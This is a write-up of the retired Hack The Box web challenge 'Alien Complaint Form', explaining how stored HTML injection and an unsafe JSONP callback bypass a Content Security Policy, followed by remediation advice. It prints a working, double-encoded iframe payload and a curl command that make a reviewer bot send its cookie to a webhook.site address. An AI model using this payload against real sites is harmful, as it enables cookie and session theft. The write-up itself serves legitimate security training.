---
title: "Hack The Box Challenge — Alien Complaint Form"
summary: "Alien Complaint Form combines stored HTML injection with an unsafe same-origin JSONP callback to bypass CSP and expose a bot-only cookie."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Web"
difficulty: "Medium"
solvedAt: 2026-09-13
publishedAt: 2026-09-13
tags:
  - web-security
  - stored-xss
  - csp-bypass
  - jsonp
  - html-injection
  - puppeteer
  - source-code-review
tools:
  - unzip
  - tree
  - sed
  - curl
  - Python
  - Webhook.site
cves: []
htbUrl: "https://app.hackthebox.com/challenges/Alien%2520Complaint%2520Form"
cover: "/images/writeups/hackthebox/challenges/shared/hackthebox-challenge-cover.webp"
coverAlt: "Abstract cybersecurity challenge medallion with terminal, puzzle and network motifs"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Challenge Alien Complaint Form. Retirement was confirmed on 13 September 2026 by the challenge page's available official write-up. The real flag, ephemeral target address, callback identifier and unrelated personal information have been removed. The original challenge package is not redistributed.

More retired Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

Alien Complaint Form is a white-box Web challenge about the limits of Content Security Policy. The application stores complaints and later renders them inside a localhost-only page reviewed by a Puppeteer bot. That bot carries the flag in a JavaScript-readable cookie and deletes human complaints after reviewing them.

The complaint field allowed stored HTML injection, but the page's CSP blocked the obvious inline-script route. Source review revealed a same-origin JSONP endpoint whose callback name was completely attacker-controlled. An injected iframe loaded the protected list page, passed JavaScript through its `callback` query parameter and caused the page's own client code to create an allowed same-origin script. The JSONP response then navigated the bot to a controlled callback URL with `document.cookie` in the query string.

The first exploit submission reached the application but produced no callback because the JavaScript was URL-encoded only once. The client decoded it and rebuilt another query string, causing the raw `+` operator to become a space during the second query parse. Double URL encoding preserved the callback across both decoding stages. The corrected payload produced a request from `127.0.0.1:1337` containing an HTB-formatted cookie value; the value itself is omitted.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `Alien Complaint Form` |
| Platform | Hack The Box |
| Category | Web |
| Difficulty | Medium |
| Status | Retired, confirmed 13 September 2026 |
| Core chain | Stored HTML injection → JSONP callback injection → CSP bypass |
| Protected asset | A cookie available only inside the automated review session |

The scenario claimed that human complaints were ignored and deleted while hinting that the resistance had left a backdoor. That wording matched the source: every submission started an automated reviewer, and the reviewer reset the database after visiting the complaint list.

## Provided material and evidence boundaries

The challenge supplied an ephemeral HTTP service and a password-protected source archive. Extracting the archive produced this relevant structure:

```text
web_alien_complaint_form/
├── Dockerfile
├── build-docker.sh
├── config/
│   └── supervisord.conf
└── challenge/
    ├── bot.js
    ├── database.js
    ├── index.js
    ├── package.json
    ├── routes/
    │   └── index.js
    └── public/
        ├── index.html
        ├── list.html
        └── static/js/
            ├── list.js
            └── main.js
```

The archive was used only for local source review and is not included in this repository. The evidence retained outside the public site includes the extraction transcript, source listings, live HTTP responses, the initial failed payload, the corrected command sequence, proof that the challenge was retired and the successful callback screenshot. Only small source excerpts needed to explain the vulnerability appear below.

The temporary public host and port are represented as `<HOST>:<PORT>`. The unique callback path is represented as `<REDACTED_WEBHOOK_ID>`, and the recovered value is represented as `<REDACTED_FLAG>`.

## Initial analysis

The public page exposed a single complaint form. Submitting text caused the browser to send JSON to `/api/submit`:

```javascript
fetch('/api/submit', {
    method: 'POST',
    body: JSON.stringify({ complaint: complaint.value }),
    headers: { 'Content-Type': 'application/json' }
});
```

The HTML also declared a restrictive CSP:

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; object-src 'none'; base-uri 'none';
               style-src 'self' https://fonts.googleapis.com;
               font-src 'self' https://fonts.gstatic.com">
```

Because `script-src` was absent, scripts inherited `default-src 'self'`. Inline scripts and event handlers were not permitted, but JavaScript returned by the application itself remained trusted.

Live requests confirmed the access-control boundary and exposed the JSONP behavior:

```bash
curl -i http://<HOST>:<PORT>/list
```

```http
HTTP/1.1 401 Unauthorized
content-type: application/json; charset=utf-8

{"message":"Only localhost is allowed"}
```

```bash
curl -i http://<HOST>:<PORT>/api/jsonp
```

```http
HTTP/1.1 200 OK
content-type: application/javascript

display([{"id":1,"complaint":"...","species":"Alien",...}])
```

`/list` could not be opened directly from the attacking client, but `/api/jsonp` was public and returned executable JavaScript. That combination made the automated reviewer and its browser context the key attack surface.

## Tracing the automated reviewer

The submission route stored the complaint and launched the bot:

```javascript
fastify.post('/api/submit', async (request, reply) => {
    let { complaint } = request.body;

    if (complaint) {
        return db.addFeedback(complaint).then(() => {
            bot.purgeHumanEntries(db);
            reply.send({
                message: 'The Galactic Federation has processed your feedback.'
            });
        });
    }
});
```

`bot.js` showed the complete review sequence:

```javascript
await page.goto('http://127.0.0.1:1337/');
await page.setCookie(...cookies);

await page.goto('http://127.0.0.1:1337/list', {
    waitUntil: 'networkidle2'
});

await browser.close();
await db.migrate();
```

The cookie object set only a name and value. It did not set `httpOnly`, so JavaScript executing in the bot's origin could read it through `document.cookie`. After the visit, `db.migrate()` dropped and recreated the feedback table, explaining why human complaints disappeared.

The protected route relied on the request IP:

```javascript
fastify.get('/list', async (request, reply) => {
    if (request.ip != '127.0.0.1') {
        return reply.code(401).send({ message: 'Only localhost is allowed' });
    }
    return reply.sendFile('list.html');
});
```

An iframe created inside the bot's page resolves relative URLs against `127.0.0.1:1337`, so its request satisfies this check even though an external user cannot browse `/list` directly.

## Identifying the weakness

There were two cooperating client-side weaknesses. First, `list.js` inserted database values into a template and assigned it to `innerHTML` without encoding or sanitization:

```javascript
let template = `
    <tr>
        <th scope="row">${complaint.id}</th>
        <td>${complaint.complaint}</td>
        <td>${complaint.species}</td>
        <td>${complaint.created_at}</td>
    </tr>
`;

document.getElementsByTagName('tbody')[0].innerHTML += template;
```

This provided stored HTML injection. A direct inline payload was not the right primitive: inline JavaScript was blocked by CSP, and scripts introduced through `innerHTML` are not a dependable execution path.

Second, the page implemented JSONP using a callback taken from its own query string:

```javascript
const jsonp = (url, callback) => {
    const s = document.createElement('script');
    s.src = callback ? `${url}?callback=${callback}` : url;
    document.body.appendChild(s);
};

jsonp(
    '/api/jsonp',
    (new URLSearchParams(location.search)).get('callback')
);
```

The server placed that value at the beginning of a JavaScript response without validating it as a safe function name:

```javascript
let callback = request.query.callback || 'display';
reply.header('Content-Type', 'application/javascript');
reply.send(`${callback}(${JSON.stringify(feedback)})`);
```

This endpoint was the CSP gadget. The browser was allowed to execute `/api/jsonp` because it came from `'self'`, while the attacker controlled the beginning of its response.

## Exploit construction

The complaint had to create an active same-origin element without relying on inline JavaScript. An iframe met that requirement:

```html
<iframe src="/list?callback=<DOUBLE_URL_ENCODED_CALLBACK>"></iframe>
```

When the bot rendered the complaint, the iframe loaded `/list` from localhost. Its copy of `list.js` decoded the `callback` parameter and created this same-origin script request:

```text
/api/jsonp?callback=<ATTACKER_CONTROLLED_VALUE>
```

The callback JavaScript navigated the top-level bot page to the collection endpoint with the cookie URL-encoded in parameter `c`:

```javascript
top.location='<WEBHOOK_URL>?c='+encodeURIComponent(document.cookie)//
```

The trailing `//` is essential. Without it, the JSONP endpoint would append the feedback array as a function-call expression. With the comment marker, the effective response is equivalent to:

```javascript
top.location='<WEBHOOK_URL>?c='+encodeURIComponent(document.cookie)//([...])
```

Only the navigation expression executes; the generated suffix is treated as a comment.

## Verified exploit

The final working exploit was assembled and submitted from the Kali shell. It is reproduced below with the transient target and callback identifier removed:

```bash
TARGET='http://<HOST>:<PORT>'
HOOK='https://webhook.site/<REDACTED_WEBHOOK_ID>'

CALLBACK="top.location='${HOOK}?c='+encodeURIComponent(document.cookie)//"

ENCODED=$(python3 -c \
'import urllib.parse,sys; x=urllib.parse.quote(sys.argv[1],safe=""); print(urllib.parse.quote(x,safe=""))' \
"$CALLBACK")

PAYLOAD="<iframe src=\"/list?callback=$ENCODED\"></iframe>"

curl -sS -X POST "$TARGET/api/submit" \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  --data-urlencode "complaint=$PAYLOAD"
```

The application acknowledged the stored complaint:

```json
{"message":"The Galactic Federation has processed your feedback."}
```

No standalone exploit file was created during the solve. The verified exploit consisted of the shell variables, Python URL-encoding expression and `curl` request above.

## Why double URL encoding was required

The first submission encoded the callback only once. The server accepted it, but the callback collector received nothing. The printed iframe URL contained sequences such as `%3D`, `%27` and `%2B`, proving that only one encoding layer was present.

The data crossed two query-string decoding boundaries:

1. `URLSearchParams(location.search).get('callback')` decoded the value inside the iframe.
2. `list.js` interpolated that decoded value into a new `/api/jsonp?callback=...` URL, which the server parsed again.

After the first decode, the JavaScript `+` operator became a literal plus character in the second query string. Query parsing treated that `+` as a space, turning a valid concatenation expression into invalid JavaScript.

Double encoding solved the problem. For example, `%2B` became `%252B` in the iframe URL. The client-side decode reduced it to `%2B`, and the JSONP request's server-side decode finally restored the intended `+`. The same treatment preserved the rest of the callback across both stages.

This failure was useful because it demonstrated that exploit encoding must model every parser and reconstruction step, not just the first HTTP request.

## Validation

Validation combined source evidence, live behavior and the final out-of-band request:

1. Source review confirmed unsanitized `innerHTML`, an arbitrary JSONP callback, same-origin script permission and a JavaScript-readable bot cookie.
2. Live requests confirmed that `/list` rejected external clients while `/api/jsonp` returned JavaScript.
3. The application returned its success message after accepting the crafted complaint.
4. The corrected double-encoded payload generated a request at the callback collector containing `c=flag%3D<REDACTED_FLAG>`.
5. The request metadata showed `Referer: http://127.0.0.1:1337/`, `Sec-Fetch-Mode: navigate` and `Sec-Fetch-Site: cross-site`, matching the expected top-level navigation from the internal Puppeteer session.

The decoded query parameter contained an HTB-formatted flag, confirming that the protected bot value had been recovered. The value, encoded form and any value-derived hash are intentionally omitted.

## What did not work

### Single URL encoding

The first crafted complaint was stored successfully but produced no callback. This was not evidence that CSP had stopped the JSONP gadget; it was a syntax failure introduced between the two query parsers. Inspecting the generated iframe URL revealed the missing second encoding layer. Double encoding preserved the callback and produced the expected request.

### Treating CSP as the complete control

The initial page suggested that conventional inline XSS payloads would be blocked. Source review showed why continuing to mutate inline event handlers would have been the wrong direction: the application already exposed a same-origin endpoint that returned attacker-shaped JavaScript. The successful route was to use the CSP's own trust decision rather than attack inline-script syntax.

### Accessing `/list` directly

Direct requests consistently returned `401 Unauthorized`. Header spoofing was neither tested nor required. The stored iframe caused the bot itself to request the relative URL from localhost, satisfying the route's actual condition.

## Why the chain works

CSP controls where executable resources may come from; it does not determine whether every trusted resource contains safe code. A policy that permits scripts from `'self'` implicitly trusts every same-origin JavaScript-producing endpoint. The JSONP route violated that assumption by allowing an arbitrary callback expression instead of a constrained function identifier.

The stored complaint supplied HTML structure, not inline code. The iframe loaded a legitimate same-origin document, and that document created a legitimate same-origin script element. From the CSP engine's perspective, both loads were allowed. From the application's perspective, however, the script response began with attacker-controlled JavaScript.

The exploit also crossed the intended access-control boundary. The external client could not access `/list`, but the bot could. Stored content therefore became a command channel into a more privileged browser context. Because the sensitive cookie lacked `HttpOnly`, successful code execution immediately exposed it.

No single observation was sufficient by itself. The complete result required four conditions:

- Complaint content reached `innerHTML` without sanitization.
- The bot rendered that content from the localhost origin.
- `/api/jsonp` converted an arbitrary callback into same-origin JavaScript.
- The bot cookie was readable through `document.cookie`.

## Defensive perspective

The primary fixes should remove both the injection sink and the CSP gadget:

| Weakness | Defensive action |
| --- | --- |
| Complaint values inserted with `innerHTML` | Build elements with DOM APIs and assign untrusted values through `textContent`; use a proven sanitizer only when HTML is genuinely required |
| Arbitrary JSONP callback | Remove JSONP and return JSON; if legacy JSONP is unavoidable, restrict callbacks to a strict identifier grammar and a small allowlist |
| Broad trust in same-origin scripts | Use nonce- or hash-based `script-src` and audit every endpoint capable of returning JavaScript |
| Sensitive cookie readable by JavaScript | Set `HttpOnly`, `Secure` and an appropriate `SameSite` value, with the narrowest practical domain and path |
| Localhost used as the authorization decision | Require explicit authentication and authorization for the review interface rather than relying only on source IP |
| CSP delivered through a meta element | Prefer an HTTP response header and test the effective policy in the browser |

Trusted Types can add useful defense in depth for DOM injection sinks, but it does not replace correct output handling. Likewise, a stronger CSP reduces exploitability but should not be expected to repair unsafe JSONP or missing cookie protections.

Monitoring can also surface this pattern. Useful signals include complaint text containing active HTML elements, unusual `callback` values containing operators or percent-encoded punctuation, and reviewer sessions navigating to unexpected external origins.

## Key takeaways

- CSP is only as strong as the script-producing endpoints on every trusted origin.
- JSONP turns data into executable JavaScript and is especially dangerous when the callback is not strictly validated.
- Stored HTML injection can become code execution through active same-origin elements even when inline scripts are blocked.
- Automated reviewer bots are privileged clients; every value they render must be treated as attacker-controlled.
- `HttpOnly` prevents JavaScript from reading a sensitive cookie even after an XSS primitive succeeds.
- Multi-stage browser exploits require encoding for every parse, decode and reconstruction boundary.
- A failed callback can reveal a transport problem rather than a failed exploitation primitive; inspect the final JavaScript that each parser produces.

## References

- [Hack The Box — Alien Complaint Form](https://app.hackthebox.com/challenges/Alien%2520Complaint%2520Form)
- [Webhook.site](https://webhook.site/)
